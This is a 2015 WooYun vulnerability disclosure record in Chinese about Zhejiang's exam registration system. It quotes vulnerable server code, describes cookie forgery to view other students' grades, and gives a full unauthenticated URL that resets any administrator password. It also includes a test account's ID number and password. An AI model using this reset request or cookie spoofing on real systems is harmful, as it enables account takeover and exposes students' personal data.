{"id": 44335, "wybug_id": "wooyun-2015-0100976", "wybug_title": "看我如何攻破浙江招考系统之第二波（任意信息随便改+管理员密码重置）", "wybug_corp": "浙江省教育考试院", "wybug_author": "GreenVine", "wybug_date": "2015-03-13 10:34", "wybug_open_date": "2015-04-27 10:36", "wybug_type": "未授权访问/权限绕过", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏认证", "越权操作", "未授权访问", "欺骗"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-03-13：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-03-18：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-03-28：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-07：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-17：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-04-27：\t细节向公众公开  简要描述： 昨天发完浙江招考系统漏洞第一波，今天继续。设计缺陷导致可查询、修改任何考生报名、成绩信息，且可重置任意管理员密码 详细说明：  1. 判断当前用户，程序猿是介样写滴：\ncase \"getuserinfo\":\tusersfz = context.Request.Cookies[\"usersfz\"].Value;\tDataSet getuds = DbHelperOra.Query(\"select * from userinfo where SHENFENZHENG='\" + usersfz + \"'\");\tcontext.Response.Write(JsonHelper.ToJson(getuds.Tables[0]));\tbreak;\n系统提供了一个测试学生帐号：身份证：310200199402110638密码：lAc8in5Fa\n\n我们选一个真实学生钟方某：\n\n登进去后直接改Cookie为他的身份证号，刷新查成绩，get √\n\n注：系统大部分操作完全依赖Cookie里面的值，带入SQL直接查询未做任何过滤，你懂得。2. 无意中发现一个很有意思的接口：http://pgzy.zjzs.net:8011/admin/gk201501/ashx/meminf.ashx?action=save_czmm_update&edit_mem_no_Text=admin&cookie_mem_no_Text=adminedit_mem_no_Text就是要修改的管理员用户名，成功后重置为123456\n\n\ncase \"save_czmm_update\":\tstring save_czmm_update_cookie_mem_no_Str = context.Request.Params[\"cookie_mem_no_Text\"];\tstring save_czmm_update_edit_mem_no_Str = context.Request.Params[\"edit_mem_no_Text\"];\tstring save_czmm_update_new_mm_Str = \"e10adc3949ba59abbe56e057f20f883e\";\tif (Zjnu.Common.Kaowuclass.allXM_If_can_Reset_mima_fun(save_czmm_update_cookie_mem_no_Str, save_czmm_update_edit_mem_no_Str, param_XM_Name_Str))\t{\t\tint resunt_int = DbHelperOra.ExecuteSql(\"update BAS_MEMBER set MEM_PASSWORD='\" + save_czmm_update_new_mm_Str + \"',LOGINIP='' where MEM_NO='\" + save_czmm_update_edit_mem_no_Str + \"'\");\t\t//添加日志\t\tstring save_czmm_update_old_zhi_Str, save_czmm_update_new_zhi_Str;\t\tsave_czmm_update_old_zhi_Str = \"\";\t\tsave_czmm_update_new_zhi_Str = \"update BAS_MEMBER set MEM_PASSWORD='\" + save_czmm_update_new_mm_Str + \"',LOGINIP='' where MEM_NO='\" + save_czmm_update_edit_mem_no_Str + \"'\";\t\tsave_czmm_update_new_zhi_Str = save_czmm_update_new_zhi_Str.Replace(\"'\", \"\");\t\tZjnu.Common.LOGHelper.AddLog(cookie_MEM_NO_Str, cookie_MEM_NAME_Str, DateTime.Now, cookie_MEM_LOGINIP_Str, param_XM_Name_Str, \"\", \"meminf\", \"save_czmm_update\", save_czmm_update_old_zhi_Str, save_czmm_update_new_zhi_Str, \"成功重置管理员密码\");\t\tcontext.Response.Write(\"{\\\"status\\\": \\\"success\\\",\\\"cz_result\\\": \\\"\" + \"更新成功。\" + \"\\\"}\");\t}\n   漏洞证明：  1. Cookie欺骗\n\n\n\n2. 未授权访问\n\n   修复方案：  你懂的提供漏洞信息高考加分么？   版权声明：转载请注明来源 GreenVine@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：14  确认时间：2015-03-18 08:31 厂商回复： CNVD确认所述风险,已经转由CNCERT发给浙江分中心处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-03-13 10:38 |    \t\tGrayTrack \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:14        | 灰色轨迹)\t\t \n  学生党    \n     2015-03-13 14:52 |    \t\t只发通用型 \t\t\t( 实习白帽子  |\t\t\t        Rank:93 漏洞数:14        | 刷通用型奖金小号)\t\t \n  看来是整个系统都没有做权限判断    \n     2015-04-19 09:41 |    \t\tyinian \t\t\t( 实习白帽子  |\t\t\t        Rank:67 漏洞数:22        | 代 码 审 计 求 交 流)\t\t \n  开源的代码？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 14, "Ranks": null}